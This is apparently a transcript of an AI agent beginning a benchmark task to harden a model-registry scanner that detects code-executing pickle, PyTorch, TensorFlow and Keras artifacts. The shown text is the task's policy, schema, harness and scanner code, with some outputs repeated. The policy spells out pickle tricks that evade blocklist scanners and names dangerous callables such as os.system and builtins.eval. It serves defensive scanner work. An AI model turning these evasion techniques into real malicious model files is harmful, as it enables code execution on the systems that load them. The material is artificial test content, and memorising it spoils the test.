steps.message:
ModelGate is the static scanner our model registry runs on every uploaded artifact before accepting it. It lives in `/app/modelgate/` and the registry invokes it once per artifact as `python3 -I /app/modelgate/cli.py scan --output /tmp/report.json /path/to/artifact`, reading the JSON report described in `/app/docs/report-schema.md`. The red team has shown that artifacts which run code when loaded get past it, and that it also flags some legitimate models. Harden the scanner so that its verdict matches the registry policy in `/app/docs/threat-model.md` for every artifact that policy covers: an artifact is `malicious` when loading it with its format's standard loader, or invoking a function it exports, would execute attacker-controlled code, start a process, access files outside the artifact, or open a network connection, and `clean` otherwise. A missed malicious artifact and a flagged legitimate one are equally wrong.

The registry grades the scanner on its own held-out corpus, built to the threat model, not on the examples in `/app/samples/`. Those examples, their labels in `/app/samples/labels.json` and the harness `/app/evaluate.py` show the formats, containers and report format, but they do not cover every technique the threat model describes. Only `/app/modelgate/` is deployed, so everything the scanner needs must live there, and the command line and report schema above must keep working unchanged. Scanning must never cause any behaviour of an artifact to run: the registry runs the scanner in an isolated sandbox and treats any process it starts, any network connection it opens and any file it writes other than its report as a failed scan. The registry scans its held-out corpus of roughly 650 artifacts in one pass, invoking the scanner once per artifact; the whole pass must finish within 900 seconds and no single artifact may take more than 60 seconds, using only the Python packages already installed in this environment.

You have 28800 seconds to complete this task. Do not cheat by using online solutions or hints specific to this task.
I'll start by exploring the scanner, docs, samples, and evaluation harness to understand the current state before hardening anything.

results.content:
# ModelGate registry policy: what makes an uploaded model artifact malicious

This is the policy the registry grades scanner verdicts against. It is the
only definition that matters; the examples under `/app/samples/` illustrate it
but do not enumerate it.

## 1. Policy

An artifact is **malicious** if, and only if, loading it with its format's
standard loader, or invoking a function the artifact exports, would do any of
the following as a direct consequence, before the model is otherwise used:

- **(A) code execution**: execute attacker-controlled Python, directly or
  through indirection. Indirection includes calling a Python callable that
  evaluates or compiles source, materialising serialized bytecode into a
  function, and re-entrant deserialization: handing embedded data to another
  loader that would then do any of (A)-(D). A nested loader is judged by what
  it would load; a nested loader fed data that does none of (A)-(D) is not a
  finding.
- **(B) process**: start a process or run a shell command.
- **(C) file access**: read, write, create, delete or move a file outside the
  artifact itself.
- **(D) network**: open a network connection.

Every other artifact in scope is **clean**. A false positive and a false
negative are equally wrong.

Capabilities are the test, not names. A string that contains `os.system`, a
dictionary value `"subprocess"`, a graph node *named* `ReadFile`, or a constant
tensor holding `PyFunc` is data, not a finding. Conversely a capability reached
through a harmless-looking path (a memoised reference, a `getattr` chain, a
`functools.partial` that is retargeted later, a second pickle stream after the
first `STOP`, a function body referenced only through a node attribute) is a
finding.

Standard loaders, for the purpose of this policy:

| Format | Loader |
|---|---|
| pickle stream(s) | `pickle.load`, called repeatedly until end of file where the format is a sequence of pickles; `joblib.load` |
| PyTorch checkpoint | `torch.load(weights_only=False)` |
| NumPy | `numpy.load(allow_pickle=True)` |
| TensorFlow SavedModel | `tf.saved_model.load` with the `serve` tag set, then every exported signature is called |
| Keras HDF5 and `.keras` | `keras.models.load_model` with unsafe deserialization enabled (`safe_mode=False`, or `keras.config.enable_unsafe_deserialization()` for HDF5), then the model is called |
| compressed or archived artifact | the registry unpacks it and loads each member by that member's own format |

## 2. Formats and containers in scope

| Format | Shapes that occur | Notes |
|---|---|---|
| Raw pickle | `.pkl .pickle .bin .joblib`; protocols 0 to 5; one stream, or several concatenated streams read until end of file | protocol-0 text opcodes (`c`, `i`, `o`, `p`, `g`, `R`, `b`) are as valid as their binary forms |
| PyTorch zip checkpoint | `.pt .pth .bin .ckpt`; a zip holding `<prefix>/data.pkl`, `<prefix>/data/<n>` storages, `<prefix>/version`, `<prefix>/byteorder`; stored entries, a zip64 end-of-central-directory record with 32-bit sizes, as `torch.save` writes it | `torch.load` requires the local-header magic at offset 0 |
| PyTorch legacy checkpoint | five consecutive pickles (magic, protocol, system info, the object, storage keys) followed by raw storage bytes | `torch.load` unpickles all five streams in order; the object pickle is the fourth |
| NumPy | `.npy` with object dtype (header, then a pickle); `.npz` (a zip of `.npy` members) | |
| Compressed / archived | `.gz` (one or several members), `.bz2`, `.xz`, `.zip` (possibly with bytes before the first local file header, as `zipfile` tolerates: the central directory decides, a later entry with the same name wins), `.tar`, `.tar.gz`, `.tgz`, wrapping any in-scope artifact, nested up to three levels | content, not extension, decides the format at every level |
| TensorFlow SavedModel | a directory holding `saved_model.pb` or `saved_model.pbtxt` and `variables/` | every `meta_graphs[*]` is in scope, and within each: `graph_def.node`, every `graph_def.library.function[*].node_def`, and every function referenced through a node attribute (`If`, `StatelessIf`, `While`, `StatelessWhile`, `Case`, `PartitionedCall`, `StatefulPartitionedCall`, `MapDefun`, `For`) |
| Keras HDF5 | `.h5 .hdf5`; the root attribute `model_config` holds the model JSON | sub-models nest at any depth; wrapper layers (`TimeDistributed`, `Bidirectional`) hold a layer under `layer` |
| Keras v3 archive | `.keras`; a zip holding `config.json`, `metadata.json`, `model.weights.h5` | same JSON structure as `model_config` |

Out of scope and never submitted to the registry: ONNX, GGUF, safetensors,
TorchScript `code/*.py`, TFLite, PMML, XGBoost and LightGBM native formats,
Keras SavedModel `keras_metadata.pb`, HDF5 external links and virtual
datasets, archives with 64-bit sizes or zip64 extra fields.

## 3. Pickle semantics the policy follows

These are the facts of CPython's unpickler; the policy is defined in terms of
what the loader would actually do.

- `REDUCE` calls the callable with the arguments (a tuple: `pickle.load`'s C
  unpickler raises on anything else before calling); on a class that runs
  `__new__` and `__init__`. `INST` and `OBJ` with arguments construct fully.
  `BUILD` calls `__setstate__` on the object (for `functools.partial` that
  retargets the partial) or, when there is none, writes the state into the
  object's `__dict__`, which on a module rebinds its attributes for every
  later `GLOBAL`. These are the ways a capability executes. A dotted name in
  `GLOBAL`/`STACK_GLOBAL` (`Bdb.run`, `os.system` under module `shutil`)
  resolves attribute by attribute at protocol 4 and above and fails the load
  below that.
- `NEWOBJ` and `NEWOBJ_EX` call `__new__` only; argument-less `INST`/`OBJ`
  call `__new__` only when the target is a class, and call any other callable

# ModelGate registry policy: what makes an uploaded model artifact malicious

This is the policy the registry grades scanner verdicts against. It is the
only definition that matters; the examples under `/app/samples/` illustrate it
but do not enumerate it.

## 1. Policy

An artifact is **malicious** if, and only if, loading it with its format's
standard loader, or invoking a function the artifact exports, would do any of
the following as a direct consequence, before the model is otherwise used:

- **(A) code execution**: execute attacker-controlled Python, directly or
  through indirection. Indirection includes calling a Python callable that
  evaluates or compiles source, materialising serialized bytecode into a
  function, and re-entrant deserialization: handing embedded data to another
  loader that would then do any of (A)-(D). A nested loader is judged by what
  it would load; a nested loader fed data that does none of (A)-(D) is not a
  finding.
- **(B) process**: start a process or run a shell command.
- **(C) file access**: read, write, create, delete or move a file outside the
  artifact itself.
- **(D) network**: open a network connection.

Every other artifact in scope is **clean**. A false positive and a false
negative are equally wrong.

Capabilities are the test, not names. A string that contains `os.system`, a
dictionary value `"subprocess"`, a graph node *named* `ReadFile`, or a constant
tensor holding `PyFunc` is data, not a finding. Conversely a capability reached
through a harmless-looking path (a memoised reference, a `getattr` chain, a
`functools.partial` that is retargeted later, a second pickle stream after the
first `STOP`, a function body referenced only through a node attribute) is a
finding.

Standard loaders, for the purpose of this policy:

| Format | Loader |
|---|---|
| pickle stream(s) | `pickle.load`, called repeatedly until end of file where the format is a sequence of pickles; `joblib.load` |
| PyTorch checkpoint | `torch.load(weights_only=False)` |
| NumPy | `numpy.load(allow_pickle=True)` |
| TensorFlow SavedModel | `tf.saved_model.load` with the `serve` tag set, then every exported signature is called |
| Keras HDF5 and `.keras` | `keras.models.load_model` with unsafe deserialization enabled (`safe_mode=False`, or `keras.config.enable_unsafe_deserialization()` for HDF5), then the model is called |
| compressed or archived artifact | the registry unpacks it and loads each member by that member's own format |

## 2. Formats and containers in scope

| Format | Shapes that occur | Notes |
|---|---|---|
| Raw pickle | `.pkl .pickle .bin .joblib`; protocols 0 to 5; one stream, or several concatenated streams read until end of file | protocol-0 text opcodes (`c`, `i`, `o`, `p`, `g`, `R`, `b`) are as valid as their binary forms |
| PyTorch zip checkpoint | `.pt .pth .bin .ckpt`; a zip holding `<prefix>/data.pkl`, `<prefix>/data/<n>` storages, `<prefix>/version`, `<prefix>/byteorder`; stored entries, a zip64 end-of-central-directory record with 32-bit sizes, as `torch.save` writes it | `torch.load` requires the local-header magic at offset 0 |
| PyTorch legacy checkpoint | five consecutive pickles (magic, protocol, system info, the object, storage keys) followed by raw storage bytes | `torch.load` unpickles all five streams in order; the object pickle is the fourth |
| NumPy | `.npy` with object dtype (header, then a pickle); `.npz` (a zip of `.npy` members) | |
| Compressed / archived | `.gz` (one or several members), `.bz2`, `.xz`, `.zip` (possibly with bytes before the first local file header, as `zipfile` tolerates: the central directory decides, a later entry with the same name wins), `.tar`, `.tar.gz`, `.tgz`, wrapping any in-scope artifact, nested up to three levels | content, not extension, decides the format at every level |
| TensorFlow SavedModel | a directory holding `saved_model.pb` or `saved_model.pbtxt` and `variables/` | every `meta_graphs[*]` is in scope, and within each: `graph_def.node`, every `graph_def.library.function[*].node_def`, and every function referenced through a node attribute (`If`, `StatelessIf`, `While`, `StatelessWhile`, `Case`, `PartitionedCall`, `StatefulPartitionedCall`, `MapDefun`, `For`) |
| Keras HDF5 | `.h5 .hdf5`; the root attribute `model_config` holds the model JSON | sub-models nest at any depth; wrapper layers (`TimeDistributed`, `Bidirectional`) hold a layer under `layer` |
| Keras v3 archive | `.keras`; a zip holding `config.json`, `metadata.json`, `model.weights.h5` | same JSON structure as `model_config` |

Out of scope and never submitted to the registry: ONNX, GGUF, safetensors,
TorchScript `code/*.py`, TFLite, PMML, XGBoost and LightGBM native formats,
Keras SavedModel `keras_metadata.pb`, HDF5 external links and virtual

# ModelGate scanner contract

## Invocation

The registry runs the scanner once per uploaded artifact, from a working
directory that is not `/app`, with no environment variables beyond `PATH`,
`HOME` and `TMPDIR`:

```
python3 -I /app/modelgate/cli.py scan --output <report.json> <path>
```

`<path>` is the artifact: a file, or a directory for a TensorFlow SavedModel.
The scanner must write exactly one JSON document to `<report.json>` and exit
with status 0 once it is written. Exit status 2 is reserved for a usage error
(missing or unknown arguments). Only `/app/modelgate/` is deployed to the
registry; the scanner may use nothing outside it except the Python packages
already installed in this environment. The registry's held-out corpus holds
roughly 650 artifacts and is scanned in one pass, one invocation per artifact:
the whole pass must finish within 900 seconds and no single artifact may take
more than 60 seconds.

## Report

```json
{
  "scanner": "modelgate",
  "results": [
    {
      "path": "<the path argument exactly as given>",
      "verdict": "malicious",
      "findings": [
        {
          "kind": "code-execution",
          "location": "archive/data.pkl",
          "detail": "REDUCE builtins.eval"
        }
      ]
    }
  ]
}
```

Rules:

- `results` has exactly one entry per path argument, in argument order, and
  `path` repeats the argument byte for byte.
- `verdict` is `"malicious"` or `"clean"`.
- `findings` is a list that is non-empty if and only if the verdict is
  `"malicious"`.
- each finding is an object with exactly the three string keys `kind`,
  `location` and `detail`.
- `kind` is one of `"code-execution"`, `"process"`, `"file-access"`,
  `"network"`, `"unsupported"`.
- `location` names where the finding is (a container member, a pickle stream
  and opcode offset, a graph node, a layer path) and `detail` says what it is.
  Both are free text for humans.

An artifact the scanner cannot analyse must still receive a verdict. The
registry policy is fail-closed: report it `"malicious"` with one finding of
kind `"unsupported"` that says why.

A report that is missing, is not valid JSON, violates any rule above, or is
not written within the time limit counts as a wrong verdict for that artifact.
=====EVALUATE=====
#!/usr/bin/env python3
"""Run the ModelGate scanner over /app/samples the way the registry does and
compare its verdicts with /app/samples/labels.json.

Usage: python3 /app/evaluate.py [--samples DIR] [--scanner /app/modelgate/cli.py]

The scanner is invoked as a separate process per artifact, with the same
command line the registry uses, so this script never imports the scanner.
"""
import argparse
import json
import os
import subprocess
import sys
import tempfile
import time

KINDS = {"code-execution", "process", "file-access", "network", "unsupported"}


def run_scanner(cli, artifact, timeout=60):
    with tempfile.TemporaryDirectory() as tmp:
        report = os.path.join(tmp, "report.json")
        cmd = [sys.executable, "-I", cli, "scan", "--output", report, artifact]
        started = time.monotonic()
        try:
            proc = subprocess.run(cmd, cwd=tmp, capture_output=True, text=True, timeout=timeout)
        except subprocess.TimeoutExpired:
            return None, "timeout", time.monotonic() - started
        seconds = time.monotonic() - started
        if proc.returncode != 0:
            return None, f"exit {proc.returncode}: {proc.stderr.strip()[-200:]}", seconds
        try:
            with open(report, encoding="utf-8") as f:
                doc = json.load(f)
        except (OSError, ValueError) as exc:
            return None, f"unreadable report: {exc}", seconds
        return doc, None, seconds


def check_schema(doc, artifact):
    if not isinstance(doc, dict) or doc.get("scanner") != "modelgate":
        return "top-level object with scanner == modelgate expected"
    results = doc.get("results")
    if not isinstance(results, list) or len(results) != 1:
        return "results must hold exactly one entry"
    entry = results[0]
    if not isinstance(entry, dict) or set(entry) != {"path", "verdict", "findings"}:
        return "entry must have exactly path, verdict, findings"
    if entry["path"] != artifact:
        return "path must repeat the argument exactly"
    if entry["verdict"] not in ("malicious", "clean"):
        return "verdict must be malicious or clean"
    findings = entry["findings"]
    if not isinstance(findings, list):
        return "findings must be a list"
    if (entry["verdict"] == "malicious") != (len(findings) > 0):
        return "findings must be non-empty iff verdict is malicious"
    for finding in findings:
        if not isinstance(finding, dict) or set(finding) != {"kind", "location", "detail"}:
            return "each finding needs exactly kind, location, detail"
        if not all(isinstance(finding[k], str) for k in ("kind", "location", "detail")):
            return "finding fields must be strings"
        if finding["kind"] not in KINDS:
            return f"unknown finding kind {finding['kind']!r}"
    return None


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--samples", default="/app/samples")
    parser.add_argument("--scanner", default="/app/modelgate/cli.py")
    args = parser.parse_args()

    with open(os.path.join(args.samples, "labels.json"), encoding="utf-8") as f:
        labels = json.load(f)

    rows = []
    for name in sorted(labels):
        expected = labels[name]
        artifact = os.path.join(args.samples, name)
        doc, error, seconds = run_scanner(args.scanner, artifact)
        if error is None:
            error = check_schema(doc, artifact)
        if error is None:
            entry = doc["results"][0]
            verdict = entry["verdict"]
            kinds = sorted({f["kind"] for f in entry["findings"]})
        else:
            verdict = "invalid"
            kinds = []
        rows.append((name, expected, verdict, kinds, error, seconds))

    width = max(len(r[0]) for r in rows)
    print(f"{'artifact':<{width}}  expected   reported   ok  seconds  findings")
    for name, expected, verdict, kinds, error, seconds in rows:
        ok = "yes" if verdict == expected else "NO"
        extra = ",".join(kinds) if error is None else f"ERROR: {error}"
        print(f"{name:<{width}}  {expected:<9}  {verdict:<9}  {ok:<3} {seconds:7.2f}  {extra}")

    malicious = [r for r in rows if r[1] == "malicious"]
    clean = [r for r in rows if r[1] == "clean"]
    caught = sum(1 for r in malicious if r[2] == "malicious")
    false_pos = sum(1 for r in clean if r[2] != "clean")
    invalid = sum(1 for r in rows if r[4] is not None)
    print()
    print(f"recall: {caught}/{len(malicious)} malicious artifacts reported malicious")
    print(f"false positives: {false_pos}/{len(clean)} clean artifacts not reported clean")
    print(f"invalid reports: {invalid}")
    print(f"slowest scan: {max(r[5] for r in rows):.2f} s")
    return 0 if caught == len(malicious) and false_pos == 0 and invalid == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
=====LABELS=====
{
  "sample_01.pickle": "malicious",
  "sample_02.bin": "malicious",
  "sample_03.bin": "malicious",
  "sample_04.joblib": "malicious",
  "sample_05.bin": "malicious",

# ModelGate scanner contract

## Invocation

The registry runs the scanner once per uploaded artifact, from a working
directory that is not `/app`, with no environment variables beyond `PATH`,
`HOME` and `TMPDIR`:

```
python3 -I /app/modelgate/cli.py scan --output <report.json> <path>
```

`<path>` is the artifact: a file, or a directory for a TensorFlow SavedModel.
The scanner must write exactly one JSON document to `<report.json>` and exit
with status 0 once it is written. Exit status 2 is reserved for a usage error
(missing or unknown arguments). Only `/app/modelgate/` is deployed to the
registry; the scanner may use nothing outside it except the Python packages
already installed in this environment. The registry's held-out corpus holds
roughly 650 artifacts and is scanned in one pass, one invocation per artifact:
the whole pass must finish within 900 seconds and no single artifact may take
more than 60 seconds.

## Report

```json
{
  "scanner": "modelgate",
  "results": [
    {
      "path": "<the path argument exactly as given>",
      "verdict": "malicious",
      "findings": [
        {
          "kind": "code-execution",
          "location": "archive/data.pkl",
          "detail": "REDUCE builtins.eval"
        }
      ]
    }
  ]
}
```

Rules:

- `results` has exactly one entry per path argument, in argument order, and
  `path` repeats the argument byte for byte.
- `verdict` is `"malicious"` or `"clean"`.
- `findings` is a list that is non-empty if and only if the verdict is
  `"malicious"`.
- each finding is an object with exactly the three string keys `kind`,
  `location` and `detail`.
- `kind` is one of `"code-execution"`, `"process"`, `"file-access"`,
  `"network"`, `"unsupported"`.
- `location` names where the finding is (a container member, a pickle stream
  and opcode offset, a graph node, a layer path) and `detail` says what it is.
  Both are free text for humans.

An artifact the scanner cannot analyse must still receive a verdict. The
registry policy is fail-closed: report it `"malicious"` with one finding of
kind `"unsupported"` that says why.

A report that is missing, is not valid JSON, violates any rule above, or is
not written within the time limit counts as a wrong verdict for that artifact.
=====EVALUATE=====
#!/usr/bin/env python3
"""Run the ModelGate scanner over /app/samples the way the registry does and
compare its verdicts with /app/samples/labels.json.

Usage: python3 /app/evaluate.py [--samples DIR] [--scanner /app/modelgate/cli.py]

The scanner is invoked as a separate process per artifact, with the same
command line the registry uses, so this script never imports the scanner.
"""
import argparse
import json
import os
import subprocess
import sys
import tempfile
import time

KINDS = {"code-execution", "process", "file-access", "network", "unsupported"}


def run_scanner(cli, artifact, timeout=60):
    with tempfile.TemporaryDirectory() as tmp:
        report = os.path.join(tmp, "report.json")
        cmd = [sys.executable, "-I", cli, "scan", "--output", report, artifact]
        started = time.monotonic()
        try:
            proc = subprocess.run(cmd, cwd=tmp, capture_output=True, text=True, timeout=timeout)
        except subprocess.TimeoutExpired:
            return None, "timeout", time.monotonic() - started
        seconds = time.monotonic() - started
        if proc.returncode != 0:
            return None, f"exit {proc.returncode}: {proc.stderr.strip()[-200:]}", seconds
        try:
            with open(report, encoding="utf-8") as f:
                doc = json.load(f)
        except (OSError, ValueError) as exc:
            return None, f"unreadable report: {exc}", seconds
        return doc, None, seconds


def check_schema(doc, artifact):
    if not isinstance(doc, dict) or doc.get("scanner") != "modelgate":
        return "top-level object with scanner == modelgate expected"
    results = doc.get("results")
    if not isinstance(results, list) or len(results) != 1:
        return "results must hold exactly one entry"
    entry = results[0]
    if not isinstance(entry, dict) or set(entry) != {"path", "verdict", "findings"}:
        return "entry must have exactly path, verdict, findings"
    if entry["path"] != artifact:
        return "path must repeat the argument exactly"
    if entry["verdict"] not in ("malicious", "clean"):
        return "verdict must be malicious or clean"
    findings = entry["findings"]
    if not isinstance(findings, list):
        return "findings must be a list"
    if (entry["verdict"] == "malicious") != (len(findings) > 0):
        return "findings must be non-empty iff verdict is malicious"
    for finding in findings:
        if not isinstance(finding, dict) or set(finding) != {"kind", "location", "detail"}:
            return "each finding needs exactly kind, location, detail"
        if not all(isinstance(finding[k], str) for k in ("kind", "location", "detail")):
            return "finding fields must be strings"
        if finding["kind"] not in KINDS:
            return f"unknown finding kind {finding['kind']!r}"
    return None


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--samples", default="/app/samples")
    parser.add_argument("--scanner", default="/app/modelgate/cli.py")
    args = parser.parse_args()

    with open(os.path.join(args.samples, "labels.json"), encoding="utf-8") as f:
        labels = json.load(f)

    rows = []
    for name in sorted(labels):
        expected = labels[name]
        artifact = os.path.join(args.samples, name)
        doc, error, seconds = run_scanner(args.scanner, artifact)
        if error is None:
            error = check_schema(doc, artifact)
        if error is None:
            entry = doc["results"][0]
            verdict = entry["verdict"]
            kinds = sorted({f["kind"] for f in entry["findings"]})
        else:
            verdict = "invalid"
            kinds = []
        rows.append((name, expected, verdict, kinds, error, seconds))

    width = max(len(r[0]) for r in rows)
    print(f"{'artifact':<{width}}  expected   reported   ok  seconds  findings")
    for name, expected, verdict, kinds, error, seconds in rows:
        ok = "yes" if verdict == expected else "NO"
        extra = ",".join(kinds) if error is None else f"ERROR: {error}"
        print(f"{name:<{width}}  {expected:<9}  {verdict:<9}  {ok:<3} {seconds:7.2f}  {extra}")

    malicious = [r for r in rows if r[1] == "malicious"]
    clean = [r for r in rows if r[1] == "clean"]
    caught = sum(1 for r in malicious if r[2] == "malicious")
    false_pos = sum(1 for r in clean if r[2] != "clean")
    invalid = sum(1 for r in rows if r[4] is not None)
    print()
    print(f"recall: {caught}/{len(malicious)} malicious artifacts reported malicious")
    print(f"false positives: {false_pos}/{len(clean)} clean artifacts not reported clean")
    print(f"invalid reports: {invalid}")
    print(f"slowest scan: {max(r[5] for r in rows):.2f} s")
    return 0 if caught == len(malicious) and false_pos == 0 and invalid == 0 else 1


if __name__ == "__main__":
    sys.exit(main())

     1	"""Pickle stream scanning.
     2	
     3	Walks the opcodes of a pickle with ``pickletools.genops`` and reports any
     4	global reference on the blocklist.  ``GLOBAL`` carries the module and name in
     5	its argument; ``STACK_GLOBAL`` (protocol 4 and later) takes them from the two
     6	strings pushed just before it.
     7	"""
     8	from __future__ import annotations
     9	
    10	import pickletools
    11	
    12	from modelgate.policy import PICKLE_BLOCKLIST, SUSPICIOUS_STRINGS
    13	from modelgate.report import Finding
    14	
    15	_STRING_OPS = {"SHORT_BINUNICODE", "BINUNICODE", "BINUNICODE8", "UNICODE", "STRING", "SHORT_BINSTRING", "BINSTRING"}
    16	_MEMO_PUT_OPS = {"MEMOIZE", "BINPUT", "LONG_BINPUT", "PUT"}  # the pickler memoizes every string it writes
    17	
    18	
    19	def scan_pickle(data: bytes, location: str) -> list[Finding]:
    20	    findings: list[Finding] = []
    21	    recent: list[str] = []  # the last two string pushes, for STACK_GLOBAL
    22	    try:
    23	        for op, arg, pos in pickletools.genops(data):
    24	            if op.name in _STRING_OPS:
    25	                recent = (recent + [str(arg)])[-2:]
    26	                for needle in SUSPICIOUS_STRINGS:
    27	                    if needle in str(arg):
    28	                        findings.append(Finding("code-execution", f"{location}@{pos}", f"suspicious string {needle!r} in data"))
    29	                        break
    30	                continue
    31	            if op.name == "GLOBAL":
    32	                module, name = str(arg).split(" ", 1)
    33	                _check_global(module, name, f"{location}@{pos}", findings)
    34	            elif op.name == "STACK_GLOBAL":
    35	                if len(recent) == 2:
    36	                    _check_global(recent[0], recent[1], f"{location}@{pos}", findings)
    37	            elif op.name == "STOP":
    38	                break
    39	            if op.name not in _STRING_OPS and op.name not in _MEMO_PUT_OPS:
    40	                recent = []
    41	    except Exception as exc:  # noqa: BLE001 - truncated or odd pickles are not our problem
    42	        findings.append(Finding("unsupported", location, f"could not walk pickle opcodes: {exc}"))
    43	    return findings
    44	
    45	
    46	def _check_global(module: str, name: str, location: str, findings: list[Finding]) -> None:
    47	    key = f"{module}.{name}"
    48	    kind = PICKLE_BLOCKLIST.get(key)
    49	    if kind:
    50	        findings.append(Finding(kind, location, f"dangerous global {key}"))

     1	"""Report objects and JSON serialisation (see /app/docs/report-schema.md)."""
     2	from __future__ import annotations
     3	
     4	import json
     5	from dataclasses import dataclass, field
     6	
     7	KINDS = ("code-execution", "process", "file-access", "network", "unsupported")
     8	
     9	
    10	@dataclass
    11	class Finding:
    12	    kind: str
    13	    location: str
    14	    detail: str
    15	
    16	    def __post_init__(self):
    17	        if self.kind not in KINDS:
    18	            raise ValueError(f"unknown finding kind {self.kind!r}")
    19	
    20	
    21	@dataclass
    22	class Result:
    23	    path: str
    24	    findings: list[Finding] = field(default_factory=list)
    25	
    26	    @property
    27	    def verdict(self) -> str:
    28	        return "malicious" if self.findings else "clean"
    29	
    30	    def to_dict(self) -> dict:
    31	        return {
    32	            "path": self.path,
    33	            "verdict": self.verdict,
    34	            "findings": [{"kind": f.kind, "location": f.location, "detail": f.detail} for f in self.findings],
    35	        }
    36	
    37	
    38	def to_json(results: list[Result]) -> str:
    39	    return json.dumps({"scanner": "modelgate", "results": [r.to_dict() for r in results]}, indent=2, ensure_ascii=False) + "\n"

     1	"""Keras HDF5 scanning: Lambda layers in the model configuration."""
     2	from __future__ import annotations
     3	
     4	import json
     5	
     6	from modelgate.report import Finding
     7	
     8	
     9	def scan_h5(path: str, location: str) -> list[Finding]:
    10	    import h5py  # lazy: only needed for Keras files
    11	
    12	    with h5py.File(path, "r") as fh:
    13	        raw = fh.attrs.get("model_config")
    14	    if raw is None:
    15	        return []
    16	    if isinstance(raw, bytes):
    17	        raw = raw.decode("utf-8")
    18	    config = json.loads(raw)
    19	    findings: list[Finding] = []
    20	    for i, layer in enumerate(config.get("config", {}).get("layers", [])):
    21	        if layer.get("class_name") == "Lambda":
    22	            findings.append(Finding("code-execution", f"{location}:layers[{i}]", "Lambda layer"))
    23	    return findings

    20	    if not sm.meta_graphs:
    21	        return findings
    22	    graph = sm.meta_graphs[0].graph_def
    23	    for node in graph.node:
    24	        kind = TF_FILE_OPS.get(node.op)
    25	        if kind:
    26	            findings.append(Finding(kind, f"saved_model.pb:node[{node.name}]", f"op {node.op}"))
    27	    return findings

     7	is written; exits 2 on a usage error.  ``-I`` keeps the script directory off
     8	sys.path, so the package directory's parent is added explicitly below.

    23	    parser.add_argument("--version", action="version", version=f"modelgate {__version__}")
    24	    sub = parser.add_subparsers(dest="command", required=True)
    25	    scan = sub.add_parser("scan", help="scan one or more artifacts")
    26	    scan.add_argument("--output", required=True, help="where to write the JSON report")

     1	"""Pickle stream scanning.
     2	
     3	Walks the opcodes of a pickle with ``pickletools.genops`` and reports any
     4	global reference on the blocklist.  ``GLOBAL`` carries the module and name in
     5	its argument; ``STACK_GLOBAL`` (protocol 4 and later) takes them from the two
     6	strings pushed just before it.
     7	"""
     8	from __future__ import annotations
     9	
    10	import pickletools
    11	
    12	from modelgate.policy import PICKLE_BLOCKLIST, SUSPICIOUS_STRINGS
    13	from modelgate.report import Finding
    14	
    15	_STRING_OPS = {"SHORT_BINUNICODE", "BINUNICODE", "BINUNICODE8", "UNICODE", "STRING", "SHORT_BINSTRING", "BINSTRING"}
    16	_MEMO_PUT_OPS = {"MEMOIZE", "BINPUT", "LONG_BINPUT", "PUT"}  # the pickler memoizes every string it writes
    17	
    18	
    19	def scan_pickle(data: bytes, location: str) -> list[Finding]:
    20	    findings: list[Finding] = []
    21	    recent: list[str] = []  # the last two string pushes, for STACK_GLOBAL
    22	    try:
    23	        for op, arg, pos in pickletools.genops(data):
    24	            if op.name in _STRING_OPS:
    25	                recent = (recent + [str(arg)])[-2:]
    26	                for needle in SUSPICIOUS_STRINGS:
    27	                    if needle in str(arg):
    28	                        findings.append(Finding("code-execution", f"{location}@{pos}", f"suspicious string {needle!r} in data"))
    29	                        break
    30	                continue
    31	            if op.name == "GLOBAL":
    32	                module, name = str(arg).split(" ", 1)
    33	                _check_global(module, name, f"{location}@{pos}", findings)
    34	            elif op.name == "STACK_GLOBAL":
    35	                if len(recent) == 2:
    36	                    _check_global(recent[0], recent[1], f"{location}@{pos}", findings)
    37	            elif op.name == "STOP":
    38	                break
    39	            if op.name not in _STRING_OPS and op.name not in _MEMO_PUT_OPS:
    40	                recent = []
    41	    except Exception as exc:  # noqa: BLE001 - truncated or odd pickles are not our problem
    42	        findings.append(Finding("unsupported", location, f"could not walk pickle opcodes: {exc}"))
    43	    return findings
    44	
    45	
    46	def _check_global(module: str, name: str, location: str, findings: list[Finding]) -> None:
    47	    key = f"{module}.{name}"
    48	    kind = PICKLE_BLOCKLIST.get(key)
    49	    if kind:
    50	        findings.append(Finding(kind, location, f"dangerous global {key}"))

     1	"""Pickle stream scanning.
     2	
     3	Walks the opcodes of a pickle with ``pickletools.genops`` and reports any
     4	global reference on the blocklist.  ``GLOBAL`` carries the module and name in
     5	its argument; ``STACK_GLOBAL`` (protocol 4 and later) takes them from the two
     6	strings pushed just before it.
     7	"""
     8	from __future__ import annotations
     9	
    10	import pickletools
    11	
    12	from modelgate.policy import PICKLE_BLOCKLIST, SUSPICIOUS_STRINGS
    13	from modelgate.report import Finding
    14	
    15	_STRING_OPS = {"SHORT_BINUNICODE", "BINUNICODE", "BINUNICODE8", "UNICODE", "STRING", "SHORT_BINSTRING", "BINSTRING"}
    16	_MEMO_PUT_OPS = {"MEMOIZE", "BINPUT", "LONG_BINPUT", "PUT"}  # the pickler memoizes every string it writes
    17	
    18	
    19	def scan_pickle(data: bytes, location: str) -> list[Finding]:
    20	    findings: list[Finding] = []
    21	    recent: list[str] = []  # the last two string pushes, for STACK_GLOBAL
    22	    try:
    23	        for op, arg, pos in pickletools.genops(data):
    24	            if op.name in _STRING_OPS:
    25	                recent = (recent + [str(arg)])[-2:]
    26	                for needle in SUSPICIOUS_STRINGS:
    27	                    if needle in str(arg):
    28	                        findings.append(Finding("code-execution", f"{location}@{pos}", f"suspicious string {needle!r} in data"))
    29	                        break
    30	                continue
    31	            if op.name == "GLOBAL":
    32	                module, name = str(arg).split(" ", 1)
    33	                _check_global(module, name, f"{location}@{pos}", findings)
    34	            elif op.name == "STACK_GLOBAL":
    35	                if len(recent) == 2:
    36	                    _check_global(recent[0], recent[1], f"{location}@{pos}", findings)
    37	            elif op.name == "STOP":
    38	                break
    39	            if op.name not in _STRING_OPS and op.name not in _MEMO_PUT_OPS:
    40	                recent = []
    41	    except Exception as exc:  # noqa: BLE001 - truncated or odd pickles are not our problem
    42	        findings.append(Finding("unsupported", location, f"could not walk pickle opcodes: {exc}"))
    43	    return findings
    44	
    45	
    46	def _check_global(module: str, name: str, location: str, findings: list[Finding]) -> None:
    47	    key = f"{module}.{name}"
    48	    kind = PICKLE_BLOCKLIST.get(key)
    49	    if kind:
    50	        findings.append(Finding(kind, location, f"dangerous global {key}"))

arguments.command:
cd /tmp/inspect && python3 -I - <<'EOF'
import pickletools, pickle, io, _compat_pickle
